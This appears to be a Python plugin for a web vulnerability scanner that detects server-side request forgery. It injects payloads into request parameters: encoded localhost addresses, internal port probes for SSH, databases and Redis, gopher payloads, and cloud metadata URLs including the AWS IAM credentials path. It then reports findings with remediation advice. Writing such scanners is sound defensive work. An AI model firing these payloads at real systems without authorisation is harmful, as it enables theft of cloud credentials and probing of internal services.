"""Server-Side Request Forgery (SSRF) audit plugin.

Detects SSRF via direct payload injection, redirect-based SSRF,
and cloud metadata access attempts. Tests GET and POST params.
"""

from __future__ import annotations

import asyncio
from typing import Any

import structlog

from xfweb.core.plugins.plugin_base import AuditPlugin
from xfweb.core.net.http_engine import HttpEngine
from xfweb.core.data.parsers.param_extractor import extract_params

logger = structlog.get_logger()

SSRF_PAYLOADS = [
    ("http://127.0.0.1", ["localhost", "127.0.0.1"]),
    ("http://localhost", ["localhost"]),
    ("http://[::1]", ["localhost"]),
    ("http://0x7f000001", ["localhost"]),
    ("http://2130706433", ["localhost"]),
    ("http://0177.0.0.1", ["localhost"]),
]

PORT_PAYLOADS = [
    ("http://127.0.0.1:22", ["SSH", "OpenSSH", "SSH-"]),
    ("http://127.0.0.1:80", ["HTTP"]),
    ("http://127.0.0.1:443", []),
    ("http://127.0.0.1:3306", ["MySQL", "mysql"]),
    ("http://127.0.0.1:5432", ["PostgreSQL", "psql"]),
    ("http://127.0.0.1:6379", ["redis_version", "redis"]),
    ("http://127.0.0.1:27017", ["MongoDB"]),
    ("http://127.0.0.1:9200", ["cluster_name", "elasticsearch"]),
]

CLOUD_METADATA_PAYLOADS = [
    ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "instance-type"]),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["AccessKeyId"]),
    ("http://metadata.google.internal/", ["metadata", "computeMetadata"]),
    ("http://169.254.169.254/metadata/instance", ["compute"]),
]

DNS_REBIND_PAYLOADS = [
    "http://127.0.0.1.nip.io",
    "http://localtest.me",
]

GOPHER_PAYLOADS = [
    ("gopher://127.0.0.1:6379/_INFO", ["redis_version"]),
    ("gopher://127.0.0.1:11211/_stats", ["pid"]),
]


class SsrfPlugin(AuditPlugin):
    """Server-Side Request Forgery vulnerability detector with cloud metadata and port scanning."""

    plugin_name = "ssrf"
    brief_description = "Detect SSRF vulnerabilities including cloud metadata and internal port scanning"

    async def audit(self, freq: Any, http: HttpEngine) -> None:
        params = self._extract_params(freq)
        if not params:
            return

        tasks = []
        for param_name, param_value in params.items():
            tasks.append(self._test_param(freq, param_name, param_value, http))
        await asyncio.gather(*tasks, return_exceptions=True)

    def _extract_params(self, freq: Any) -> dict[str, str]:
        return extract_params(freq)

    async def _test_param(self, freq: Any, param: str, value: str, http: HttpEngine) -> None:
        # Direct SSRF payloads
        for payload, markers in SSRF_PAYLOADS:
            resp = await self._inject(freq, param, payload, http)
            if resp.status_code == 0:
                continue
            if markers and any(marker in resp.text for marker in markers):
                self.report_finding(
                    name=f"SSRF via '{param}' - internal host access",
                    severity="critical",
                    url=freq.url.raw_url,
                    description=f"Server-Side Request Forgery detected in parameter '{param}'. "
                    f"The application makes requests to internal hosts.",
                    parameter=param,
                    evidence=f"Payload: {payload}\nMatching: {[m for m in markers if m in resp.text]}",
                    http_request={"method": freq.method, "url": freq.url.raw_url, "data": freq.post_data or ""},
                    http_response={"status": resp.status_code, "body_excerpt": resp.text[:500]},
                    remediation="Do not use user input to construct URLs for server-side requests. "
                    "Use an allowlist of permitted domains/protocols. "
                    "Disable unnecessary URL schemes (file://, gopher://, dict://).",
                )
                return

        # Port scanning payloads
        for payload, markers in PORT_PAYLOADS:
            resp = await self._inject(freq, param, payload, http)
            if resp.status_code == 0:
                continue
            if markers and any(marker in resp.text for marker in markers):
                port = payload.split(":")[-1].split("/")[0]
                self.report_finding(
                    name=f"SSRF via '{param}' - internal port {port} accessible",
                    severity="high",
                    url=freq.url.raw_url,
                    description=f"SSRF allows scanning internal services. "
                    f"Port {port} on localhost is accessible.",
                    parameter=param,
                    evidence=f"Payload: {payload}\nService markers found: {[m for m in markers if m in resp.text]}",
                    http_request={"method": freq.method, "url": freq.url.raw_url, "data": freq.post_data or ""},
                    http_response={"status": resp.status_code, "body_excerpt": resp.text[:300]},
                    remediation="Restrict server-side requests to external-only resources. "
                    "Use network segmentation to prevent internal access.",
                )
                return

        # Cloud metadata payloads
        for payload, markers in CLOUD_METADATA_PAYLOADS:
            resp = await self._inject(freq, param, payload, http)
            if resp.status_code == 0:
                continue
            if markers and resp.status_code == 200 and any(marker in resp.text for marker in markers):
                self.report_finding(
                    name=f"SSRF via '{param}' - cloud metadata accessible",
                    severity="critical",
                    url=freq.url.raw_url,
                    description=f"Critical SSRF: Cloud metadata endpoint is accessible. "
                    "An attacker could retrieve IAM credentials and instance information.",
                    parameter=param,
                    evidence=f"Payload: {payload}\nCloud metadata found:\n{resp.text[:500]}",
                    http_request={"method": freq.method, "url": freq.url.raw_url, "data": freq.post_data or ""},
                    http_response={"status": resp.status_code, "body_excerpt": resp.text[:500]},
                    remediation="IMDSv2 must be enforced. Block all SSRF vectors. "
                    "Use network-level controls to prevent access to 169.254.169.254.",
                )
                return

    async def _inject(self, freq: Any, param: str, payload: str, http: HttpEngine) -> Any:
        if freq.method.upper() == "POST" and freq.post_data:
            new_data = freq.post_data.replace(f"{param}=", f"{param}={payload}")
            return await http.post(freq.url.raw_url, data=new_data)
        else:
            new_url = freq.url.raw_url.replace(f"{param}=", f"{param}={payload}")
            return await http.get(new_url)
